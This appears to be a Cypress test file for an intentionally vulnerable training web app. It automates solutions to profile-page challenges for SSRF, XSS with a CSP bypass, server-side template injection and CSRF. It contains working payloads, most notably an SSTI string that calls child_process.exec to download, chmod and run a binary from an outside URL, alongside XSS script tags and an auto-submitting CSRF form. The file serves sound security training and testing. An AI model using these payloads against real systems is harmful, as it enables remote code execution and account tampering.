describe('/profile', () => {
  beforeEach(() => {
    cy.login({ email: 'admin', password: Cypress.env('ADMIN_PASSWORD') })
  })
  describe('challenge "ssrfChallenge"', () => {
    it('should be possible to request internal resources using image upload URL', () => {
      cy.visit('/profile')

      cy.get('#url').type(
        `${Cypress.config('baseUrl')}/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3`
      )
      cy.get('#submitUrl').click()
      cy.visit('/')
      cy.expectChallengeSolved({ challenge: 'SSRF' })
    })
  })

  describe('challenge "usernameXssChallenge"', () => {
    it('Username field should be susceptible to XSS attacks after disarming CSP via profile image URL', () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.visit('/profile')
          cy.get('#url').type(
            "https://a.png; script-src 'unsafe-inline' 'self' 'unsafe-eval'"
          )
          cy.get('#submitUrl').click()
          cy.get('#username').type('<<a|ascript>alert(`xss`)</script>')
          cy.get('#submit').click()

          cy.on('window:alert', (t) => {
            expect(t).to.equal('xss')
          })

          cy.get('#username').clear()
          cy.get('#username').type('Î±Î´Ð¼Î¹Î·')
          cy.get('#submit').click()

          cy.get('#url').type(
            `${Cypress.config('baseUrl')}/assets/public/images/uploads/default.svg`
          )
          cy.get('#submitUrl').click()
          cy.visit('/#/')
          cy.expectChallengeSolved({ challenge: 'CSP Bypass' })
        }
      })
    })
  })

  describe('challenge "sstiChallenge"', () => {
    it('should be possible to inject arbitrary nodeJs commands in username', () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.visit('/profile')
          cy.get('#username').type(
            "#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}",
            { parseSpecialCharSequences: false }
          )
          cy.get('#submit').click()
          cy.request(
            '/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3'
          )
          cy.visit('/')
          // void browser.driver.sleep(10000);
          // void browser.waitForAngularEnabled(true);
          cy.expectChallengeSolved({ challenge: 'SSTi' })
        }
      })
    })
  })

  describe('challenge "csrfChallenge"', () => {
    // Skipped: only works on Chrome <80 and is incompatible with current browser versions.
    xit('should be possible to perform a CSRF attack against the user profile page', () => {
      cy.visit('https://htmledit.squarefree.com')
      /* The script executed below is equivalent to pasting this string into http://htmledit.squarefree.com: */
      /* <form action="http://localhost:3000/profile" method="POST"><input type="hidden" name="username" value="CSRF"/><input type="submit"/></form><script>document.forms[0].submit();</script> */
      let document: any
      cy.window().then(() => {
        document
          .getElementsByName('editbox')[0]
          .contentDocument.getElementsByName(
            'ta'
          )[0].value = `<form action=\\"${Cypress.config('baseUrl')}/profile\\" 
        method=\\"POST\\">
        <input type=\\"hidden\\" name=\\"username\\" value=\\"CSRF\\"/>
        <input type=\\"submit\\"/>
        </form>
        <script>document.forms[0].submit();
        </script>
        `
      })
      // cy.expectChallengeSolved({ challenge: 'CSRF' })
    })

    xit('should be possible to fake a CSRF attack against the user profile page', () => {
      cy.visit('/')
      cy.window().then(async () => {
        const formData = new FormData()
        formData.append('username', 'CSRF')

        const response = await fetch(`${Cypress.config('baseUrl')}/profile`, {
          method: 'POST',
          cache: 'no-cache',
          headers: {
            'Content-type': 'application/x-www-form-urlencoded',
            Authorization: `Bearer ${localStorage.getItem('token')}`,
            Origin: 'https://htmledit.squarefree.com',
            // Cookie header removed - browser blocks unsafe header
          },
          body: formData
        })
        if (response.status === 200) {
          console.log('Success')
        }
      })
      // cy.expectChallengeSolved({ challenge: 'CSRF' })
    })
  })
})
